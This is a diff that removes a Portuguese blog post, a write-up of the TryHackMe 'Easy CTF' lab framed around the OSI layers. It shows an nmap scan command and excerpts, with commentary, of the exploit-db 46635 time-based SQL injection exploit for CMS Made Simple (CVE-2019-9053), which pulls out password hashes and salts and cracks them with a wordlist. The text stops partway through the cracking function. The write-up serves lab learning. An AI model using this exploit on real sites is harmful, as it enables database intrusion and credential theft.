@@ -1,104 +1,474 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa</title>
-<meta property="og:title" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa"><meta name=twitter:title content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa"><meta itemprop=name content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa"><meta name=application-name content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI | Obtuosa"><meta property="og:site_name" content="Obtuosa"><meta name=description content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI"><meta itemprop=description content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI"><meta property="og:description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI"><meta name=twitter:description content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://obtuosa.github.io/posts/easy-ctf/ title=English><meta property="og:type" content="article"><meta property="og:article:published_time" content=2024-10-23T00:00:00Z><meta property="article:published_time" content=2024-10-23T00:00:00Z><meta property="og:url" content="https://obtuosa.github.io/posts/easy-ctf/"><meta property="og:article:author" content><meta property="article:author" content><meta name=author content><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"Easy CTF - Uma breve jornada de exploração com base no modelo OSI","author":{"@type":"Person","name":""},"datePublished":"2024-10-23","description":"Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI","wordCount":3375,"mainEntityOfPage":"True","dateModified":"2024-10-23","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"Obtuosa"}}</script><meta name=generator content="Hugo 0.145.0"><meta property="og:url" content="https://obtuosa.github.io/posts/easy-ctf/"><meta property="og:site_name" content="Obtuosa"><meta property="og:title" content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI"><meta property="og:description" content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI"><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-23T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-23T00:00:00+00:00"><meta property="article:tag" content="Easyctf"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Cybersecurity"><meta property="article:tag" content="Osi"><meta property="og:image" content="https://obtuosa.github.io/public/avatar_hu_8a2a75f33dce1ed4"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://obtuosa.github.io/public/avatar_hu_8a2a75f33dce1ed4"><meta name=twitter:title content="Easy CTF - Uma breve jornada de exploração com base no modelo OSI"><meta name=twitter:description content="Um texto com o objetivo de apresentar a resolução da lab Easy CTF do TryHackMe pela perspectiva do modelo OSI"><link rel=canonical href=https://obtuosa.github.io/posts/easy-ctf/><link href=/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://obtuosa.github.io/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg><meta property="og:type" content="website"><meta property="og:title" content="Obtuosa"><meta property="og:description" content="Uma jornada em cibersegurança"><meta property="og:site_name" content="Obtuosa"><meta property="og:url" content="https://obtuosa.github.io/"><meta property="og:locale" content="en"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://obtuosa.github.io/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Início</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>Sobre</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Easy CTF - Uma breve jornada de exploração com base no modelo OSI</h1><div class=post-meta><time datetime=2024-10-23T00:00:00+00:00 itemprop=datePublished>23 Oct 2024</time></div></header><div class=page-content><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b5b4tjc884gh02rtrt0b.jpeg alt="Easy CTF"></p><h1 id=easy-ctf---uma-breve-jornada-de-exploração-com-base-no-modelo-osi>Easy CTF - Uma breve jornada de exploração com base no modelo OSI</h1><p>Quando se está estudando sobre fundamentos de redes, entendendo sobre o modelo OSI, arquitetura TCP/IP e etc., na mente fica o grande questionamento de como assimilar esses conceitos no cotidiano ou pelo menos de uma forma clara sobre seu funcionamento . E é por isso que esse texto irá trabalhar com essa assimilação usando a máquina <a href=https://tryhackme.com/r/room/easyctf><strong>Easy CTF</strong></a>, uma simples lab, que nesse momento irá ajudar a trabalhar um pouco sobre como operam as camadas e as interações que ocorrem entre elas no modelo OSI.</p><p>Antes de iniciar com a máquina, alguns conceitos precisam ser relembrados, ainda que de maneira breve, mas para reforçar o que se propõe esse pequeno laboratório.</p><h2 id=introdução-à-rede-de-computadores>Introdução à Rede de Computadores</h2><p>Rede de computadores são basicamente dispositivos interligados que trocam informações entre si. Nesse sentido, a rede é construída por dois aspectos principais: Conexão física e Conexão Lógica.</p><ul><li>Conexão Física: A infraestrutura física que realiza a conexão dos dispositivos. Exemplos: cabos, fios, roteadores, etc.</li><li>Conexão Lógica: Aqui seria o caminho que é estabelecido entre esses dispositivos para que ocorra essa comunicação, o transporte desses dados. Nesse aspecto, não é dependente dessa infraestrutura física, porque é com os dispositivos são configurados que ocorre essa comunicação entre si. Exemplos: protocolos, endereços IP, etc.</li></ul><p>Para que essa comunicação ocorra é necessário regras, de maneira mais direta: <strong>protocolos</strong>. Seria uma completa bagunça se não houvessem convenções e regras para definir como o seu dispositivo se comunique, por exemplo, com o servidor da <strong>Google</strong> e fosse possível acessar a página principal. Então, é fundamental o formato, sequência, como os dados são trocados, etc, para que seja possível processar as informações corretamente, de maneira eficiente e sem erros. Alem disso, existem diversos tipos de redes, que são classificados de acordo com o alcance geográfico e arquitetura, como por exemplo: LAN (Local Area Network) que seria uma rede pequena, mais local, como casa, escritório, etc., e MAN (Metropolitan Area Network) uma rede maior que a LAN para campus universitário, cidade, etc.</p><p>Em rede de computadores existem dois modelos bastante comuns de comunicação: Peer-to-Peer (P2P) e Client-Server. Existem outros, mas não serão o foco.</p><h3 id=peer-to-peer-p2p>Peer-to-Peer (P2P)</h3><p>No modelo ponto a ponto os dispositivos da rede possuem funções iguais. Cada um pode atuar como cliente ou como servidor Não se tem um controle centralizado sobre os recursos que são compartilhados e qualquer dispositivo pode compartilhar seus recursos. Exemplo: Torrent.</p><h3 id=client-server>Client-Server</h3><p>No modelo cliente-servidor a rede é construída entre cliente e servidores. No qual, o cliente (computador) solicita um tipo de serviço ou recurso ao servidor. Exemplo disso é o ato de navegar pela web.</p><h2 id=modelo-osi>Modelo OSI</h2><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8jszegsha9kwh9wcrg6g.png alt="OSI Model">
-O modelo OSI (Open Systems Interconnection) é um modelo conceitual com propósito de compreender como ocorre a comunicação em rede de computadores e é dividida em 7 camadas:</p><ul><li><strong>Camada 1 - Física</strong> tem o objetivo de realizar a transmissão física de dados através de cabos e sinais elétricos. Exemplos: Conexões fibra óptica e Cabos Ethernet.</li><li><strong>Camada 2 - Enlace</strong> seria o fiscal da transmissão desses dados, para que não ocorra erros entre os dispositivos conectados. Exemplos: Ethernet e Wi-Fi.</li><li><strong>Camada 3 - Rede</strong> é como o remetente e o destinatário, através do endereço de IP determina o caminho que os dados seguem entre os dispositivos. Exemplos: Protocolos IP e Roteadores.</li><li><strong>Camada 4 - Transporte</strong> como o próprio nome diz é o que garante o envio e o recebimento desses dados da camada três. Exemplos: TCP e UDP.</li><li><strong>Camada 5 - Sessão</strong> tem como função estabelecer e também encerrar a conexões entre aplicações. Exemplos: SSH e SCP.</li><li><strong>Camada 6 - Apresentação</strong> realize a formatação dos dados, para que possa ser compreendida pela camada superior. Exemplos: SSL/TLS e JPEG.</li><li><strong>Camada 7 - Aplicação</strong> oferece serviços e as interfaces para as aplicações dos usuários. Essa é a camada mais próxima do usuário. Exemplos: HTTP e HTTPS.
-O proposito desse modelo é ajudar na padronização, ser uma referência teórica e contribuir para o entendimento sobre a interação entre os componentes de uma rede e assim facilitando a resolução de possíveis problemas.</li></ul><h2 id=início-da-jornada>Início da jornada</h2><h3 id=reconhecimento>Reconhecimento</h3><p>O reconhecimento inicial é o passo mais importante, porque assim terá não só conhecimento sobre o alvo, mas também a maneira como será operado os primeiros passos para suceder um comprometimento inicial e acesso a informações importantes. Para além disso, é a etapa que sempre estará presente, mesmo após obter sucesso, sempre haverá um novo reconhecimento para ser feito de acordo com a elevação dos passos dados pelo invasor. Além disso, reconhecimento foi bastante retratado no texto <a href=https://dev.to/obtuosa/maquina-valley-do-tryhackme-e-o-ciclo-de-vida-de-um-ciberataque-mp6><strong>Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque</strong></a>.</p><p>Como já foi trabalhado de maneira breve sobre o que seria a camada 7, este é o primeiro contato com o alvo e é a camada mais próxima do usuário. A primeira visão dada é de uma página padrão do Apache2, apesar de não ter um conteúdo mais personalizado no que tange ao front-end é possível retirar algumas informações sobre esse servidor web, que utiliza o protocolo HTTP, nesse caso já teria uma possível falha, pois as solicitações e respostas são HTTP, ou seja, essas comunicações são realizadas em texto simples e não existe uma criptografia do que está sendo solicitado, algo que os protocolos de segurança TLS/SSL ajudariam bastante e apesar serem protocolos característicos da Camada de Apresentação, também é implementado em conjunto com os protocolos da Camada de Aplicação.
-Outro ponto interessante é a estrutura do Apache apresentada:</p><ul><li>O arquivo principal presente no diretório: /etc/apache2/apache2.conf.</li><li>A configuração de portas: /etc/apache2/ports.conf.</li><li>Além de diretórios para os módulos,configurações globais, etc.</li></ul><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f501b5xwnyz3eqjok3do.png alt="Apache2 Ubuntu Default Page">
-Nesse processo duas ferramentas foram muito importantes, o primeiro é o <strong>nmap</strong>, para o escaneamento de portas, e o segundo é o <strong>ffuf</strong> para buscar diretórios.</p><h3 id=nmap>Nmap</h3><p>O escaneamento de portas com a ferramenta Nmap envolve três camadas importantes. O primeiro, pensando na perspectiva do usuário é de aplicação, porque a flag <strong>-sV</strong> realiza uma interação com a camada 7, pois o nmap envia pacotes específicos para interagir com os protocolos dessa camada e assim possibilitar a identificação das informações necessárias sobre esses serviços em execução. Enquanto na camada de Transporte, esse processo de escaneamento utiliza protocolo TCP, a ideia é compreender como essa comunicação de identificação de serviços funcionam e o conceito por trás dos protocolos, pois é através dessa entrega de pacotes e as informações fornecidas, que é possível reconhecer as portas que estão abertas. Na camada de Rede, essa troca acontece com o endereço IP, para que possa ser enviado esses pacotes ao servidor web alvo.
-Além disso, você consegue obter duas respostas para as duas primeiras perguntas do desafio do Simple CTF:</p><ul><li>How many services are running under port 1000?</li><li>What is running on the higher port?</li></ul><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o6dqt7o6mcsojuxkz81f.png alt=Nmap></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -v -sV -p 1-3000 <span class=o>[</span>IP-ALVO<span class=o>]</span>
-</span></span></code></pre></div><h4 id=ffuf>ffuf</h4><p>O ffuf tem foco principal na camada de aplicação, porque utiliza do protocolo HTTP ou HTTPS para realizar requisições ao servidor web e assim encontrar diretórios ou arquivos, mas não é uma exclusividade esse foco com a camada de aplicação, pois o mesmo também interage com outras camadas, para que assim ocorra seu funcionamento e vasculhar por qualquer vestígio de informações. Com ele é possível encontrar o diretório <strong>/simple</strong> e ter acesso a informações sobre o <strong>CVE 2019-9053</strong> que é o estopim para ter um comprometimento inicial do servidor web. Mas, vale lembrar que as requisições HTTP do ffuf dependem do protocolo TCP, ou seja, temos aqui mais uma vez a camada de transporte presente, porque é estabelecida uma conexão confiável entre o cliente-servidor. Caso essa conexão fosse realizada pelo protocolo UDP, seria um problema, pois o mesmo não tem a garantia de entrega dos dados que são enviados. Assim como no nmap, o endereço IP também é usado para endereçar os pacotes que são enviados ao servidor e de encontro com a camada de rede.</p><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mbz84puuimbg30sreymh.png alt=ffuf></p><h3 id=diretório-simple>Diretório /simple</h3><p>No diretório <strong>/simple</strong> é possível observar que utiliza o <strong>CMS Made Simple</strong>(CMSMS) para gerenciar o conteúdo, basicamente o objetivo é criar e gerenciar os sites da web de maneira mais simples e eficiente. No entanto, o fato de não atualizarem o sistema impactou diretamente na segurança do website e com uma busca simples pelo google é possível encontrar o <a href=https://nvd.nist.gov/vuln/detail/CVE-2019-9053><strong>CVE 2019-9053</strong></a>. CVE é um sistema de padronização que possibilita identificar e catalogar vulnerabilidades e exposições de segurança e é através desse catálogo que é possível encontrar um exploit no <a href=https://www.exploit-db.com/exploits/46635><strong>exploit-db</strong></a>, que é basicamente um repositório público de exploits para acessar vulnerabilidades.</p><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tybcbzi1eybpb9ccomfi.png alt="CMS Made Simple"></p><p><img src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xvf5aeyegkw8l3szkobi.png alt=Exploit-db>
-Esse exploit é um SQL Injection que coloca comandos maliciosos em uma consulta do banco de dados SQL e poder manipular para ter acesso a principalmente credenciais, além das possibilidades de alterar as informações presentes naquele banco de dados, realizar escalonamento de privilégios, criação de novos usuários e diversas possibilidades. Esse exploit afeta justamente versões abaixo do 2.2.10 do CMS Made Simple.</p><hr><h3 id=exploit-46635py>Exploit 46635.py</h3><h3 id=módulos>Módulos</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>termcolor</span> <span class=kn>import</span> <span class=n>colored</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>termcolor</span> <span class=kn>import</span> <span class=n>cprint</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>optparse</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
-</span></span></code></pre></div><p>Este exploit utiliza de alguns módulos para que possa ter um bom funcionamento:</p><ol><li><strong>requests</strong>: O objetivo desse módulo é permitir mais praticidade para enviar pedidos HTTP/1.1.</li><li><strong>colored</strong> e <strong>cprint</strong>: O termcolor tem o propósito de realizar uma formatação de cores ANSI para o output do terminal. O que torna a interface mais agradável.</li><li><strong>time</strong>: Este módulo fornece as diversas funções relacionadas ao tempo.</li><li><strong>optparse</strong>: Uma biblioteca que lida com as linhas de comandos necessárias para realiza configurações desse exploit.</li><li><strong>hashlib</strong>: Essa lib tem principal foco calcular as hashes.</li></ol><h3 id=definição-de-argumentos-do-parser>Definição de Argumentos do Parser</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>parser</span> <span class=o>=</span> <span class=n>optparse</span><span class=o>.</span><span class=n>OptionParser</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span><span class=s1>&#39;-u&#39;</span><span class=p>,</span> <span class=s1>&#39;--url&#39;</span><span class=p>,</span> <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store&#34;</span><span class=p>,</span> <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;url&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Base target uri (ex. http://10.10.10.100/cms)&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span><span class=s1>&#39;-w&#39;</span><span class=p>,</span> <span class=s1>&#39;--wordlist&#39;</span><span class=p>,</span> <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store&#34;</span><span class=p>,</span> <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;wordlist&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Wordlist for crack admin password&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_option</span><span class=p>(</span><span class=s1>&#39;-c&#39;</span><span class=p>,</span> <span class=s1>&#39;--crack&#39;</span><span class=p>,</span> <span class=n>action</span><span class=o>=</span><span class=s2>&#34;store_true&#34;</span><span class=p>,</span> <span class=n>dest</span><span class=o>=</span><span class=s2>&#34;cracking&#34;</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Crack password with wordlist&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>options</span><span class=p>,</span> <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
-</span></span></code></pre></div><p>Com o fato lidar com as linhas de comandos que serão configuradas em prol ao exploit, o optparse.OptionParser() define os argumentos que o usuário poderá passar para o script. O -u para url, -w para a seleção da wordlist que será usada para quebrar a senha e o -c para que seja ativada essa quebra de senha.
-Essa configuração do url alvo constrói uma conexão com a Camada de Aplicação, quando se está determinando qual o endpoint que será explorado.</p><h3 id=validação-do-url>Validação do URL</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>options</span><span class=o>.</span><span class=n>url</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s2>&#34;[+] Specify an url target&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s2>&#34;[+] Example usage (no cracking password): exploit.py -u http://target-uri&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s2>&#34;[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s2>&#34;[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>()</span>
-</span></span></code></pre></div><p>Após a definição dos argumentos do Parser é realizada uma verificação, caso a url passada pelo usuário seja válida. Se for inválida, é lançado no output do terminal um script com instruções de ajuda e finaliza a execução do exploit, porque é necessário que esses dados estejam corretos, para que a conexão HTTP ocorra, garantindo a Camada de Aplicação o recebimento das informações adequadamente.</p><h3 id=variáveis>Variáveis</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>url_vuln</span> <span class=o>=</span> <span class=n>options</span><span class=o>.</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/moduleinterface.php?mact=News,m1_,default,0&#39;</span>
-</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=n>dictionary</span> <span class=o>=</span> <span class=s1>&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$&#39;</span>
-</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=kc>True</span>
-</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>temp_password</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>TIME</span> <span class=o>=</span> <span class=mi>1</span>
-</span></span><span class=line><span class=cl><span class=n>db_name</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>email</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>salt</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
-</span></span><span class=line><span class=cl><span class=n>wordlist</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span></code></pre></div><p>Nesse estágio do exploit são definidas as variáveis que constituem o ataque:</p><ul><li><strong>url_vuln</strong>: O alvo do ataque que são a url principal e o endpoint vulnerável. Consequentemente é definido o recurso no servidor web alvo que será possivelmente acessado e também explorado. Além disso, são feitas requisições HTTP, que atuam na camada de aplicação.</li><li><strong>session</strong>: É criada uma sessão HTTP, que mesmo após o servidor processar a requisição e enviar de volta a resposta, a mesma não é fechada e garante ao cliente uma nova requisição. A camada de sessão se faz presente para que seja possível gerenciar a persistência dessas conexões HTTP.</li><li><strong>dictionary</strong>: São os caracteres que serão usados para a força bruta. Através desses conjuntos de caracteres usados nesse processo de força bruta terá uma estrutura específica, tanto hexadecimal, para que seja possível gerar os payloads do SQL Injection, quanto hash MD5 e as senhas possam ser comparadas durante a quebra. Portanto, ocorre uma manipulação e também conversão dos dados, no qual a camada de apresentação lida, ou seja, transformando esses formatos de dados entre o sistema e a rede.</li><li><strong>flag</strong>: Variável utilizada em relação a controle, para que ao ser usada em loops possa determinar se o processo da extração de dados deve continuar ou não.</li><li><strong>password</strong>: Tem como objetivo armazenar a senha que será extraída do banco de dados no processo de SQL Injection. Dentro dessa perspectiva, esse campo também retrata uma etapa da apresentação quanto as possibilidades da senha ser convertida para diversos formatos e ser autenticada e quando isso ocorre se torna parte das credenciais usadas para o acesso de sistema do alvo, por parte da aplicação.</li><li><strong>temp_password</strong>: É um campo temporário que busca construir e também testar as possíveis combinações de caracteres das hashes no processo de extração da senha. Esses valores são justamente manipulados e também testados contra a url vulnerável do servidor web.</li><li><strong>TIME</strong>: Define o atraso em segundos que serão necessários para que seja validado o SQL Injection. Caso o tempo de resposta seja maior do que a definida, isso irá indicar que o payload foi realizado.</li><li><strong>db_name</strong>: Armazenamento de nome de usuário do banco de dados obtido através do SQL Injection. Mais uma vez a camada de apresentação se faz presente por se tratar de um dado que pode ser convertido para diversos formatos durante a extração e apresentação, alem de ser uma informação da aplicação alvo.</li><li><strong>email</strong>: Armazenamento do e-mail capturado do banco de dados do servidor web e por consequência também pode ser formatado ou validado antes de ser exibido na apresentação desse dado.</li><li><strong>salt</strong>: É um valor utilizado para proteger as senhas no banco de dados. É necessário tentar extrair esse valor, para que seja possível realizar ataques de força bruta nas senhas. Como resultado, é parte da apresentação por ser manipulado e processado em formato hash MD5, antes de ocorrer a comparação ao hash das senhas armazenadas.</li><li><strong>wordlist</strong>: Essa variável armazena o diretório/caminho fornecido pelo usuário para um arquivo com uma lista de palavras que serão usadas como possíveis senhas e testadas em comparativo com a hash da senha combinado em conjunto com o salt. Essas palavras que serão listadas são processadas e também manipuladas, pois são relacionadas ao salt e após isso convertidas para hashes MD5, antes de serem de fato comparadas com a hash da senha armazenada.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=n>options</span><span class=o>.</span><span class=n>wordlist</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>    <span class=n>wordlist</span> <span class=o>+=</span> <span class=n>options</span><span class=o>.</span><span class=n>wordlist</span>
-</span></span></code></pre></div><p>É importante ressaltar que essa condição apresentada acima após a definição das variáveis verifica se o usuário forneceu um caminho para o o arquivo de wordlist através do argumento definido pelo <strong>optparse</strong>. Caso tenha sido passado, o mesmo é adicionado a variável wordlist e a mesma passa a ter o diretório completo do arquivo que será usado para força bruta.</p><h3 id=função-crack_password>Função crack_password</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_password</span><span class=p>():</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>password</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>output</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>wordlist</span>
-</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>salt</span>
-</span></span><span class=line><span class=cl>    <span class=nb>dict</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>wordlist</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=nb>dict</span><span class=o>.</span><span class=n>readlines</span><span class=p>():</span>
-</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>beautify_print_try</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>salt</span><span class=p>)</span> <span class=o>+</span> <span class=n>line</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=o>==</span> <span class=n>password</span><span class=p>:</span>
